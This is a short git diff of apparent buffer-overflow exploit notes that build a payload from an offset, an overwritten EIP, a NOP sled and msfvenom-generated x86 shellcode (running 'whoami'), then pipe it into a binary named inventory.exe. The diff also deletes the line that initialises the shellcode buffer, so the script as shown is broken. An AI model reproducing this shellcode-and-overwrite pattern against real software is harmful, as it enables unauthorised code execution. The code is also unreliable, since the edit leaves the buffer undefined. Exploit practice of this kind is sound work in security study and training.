@@ -245,7 +245,6 @@ print(offset + eip + nop)
 #msfvenom payload:
     #msfvenom -p linux/x86/exec CMD=whoami -b "\x00\xfe\x20\x0a\xff" -f python
 
-buf =  b""
 buf += b"\xba\xef\x1e\xda\x84\xda\xc4\xd9\x74\x24\xf4\x5f"
 buf += b"\x29\xc9\xb1\x0b\x83\xef\xfc\x31\x57\x10\x03\x57"
 buf += b"\x10\x0d\xeb\xb0\x8f\x89\x8d\x17\xf6\x41\x83\xf4"
@@ -267,7 +266,7 @@ buf += b"\xab\xa1\xfc\xe8\xab\x25\x01\xe9\xc4\x4d\x6e\x88"
 buf += b"\x47\xe4\x70\x1d\xcb\x7f\x91\x6c\x6b"
 print(offset + eip + nop + buf)
 #msfvenom payload:
-    #msfvenom -p linux/x86/exec CMD=whoami -b "\x00\xfe\x20\x0a\xff" -f python
+    #msfvenom -p linux/x86/exec CMD=whoami -b "\x00\xfe\x20\x0a\xff" -f python       PAYLOAD PRINTED FROM SPECIFIC COMMAND WILL BE PAYLOAD IN SCRIPT  |  RUN SCRIPT IN FUNC FILE (./inventory.exe <<<$(python exp.py))
 
 ADD ALL RESULTS TO SCIRPT AND PRINT STATEMENT
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
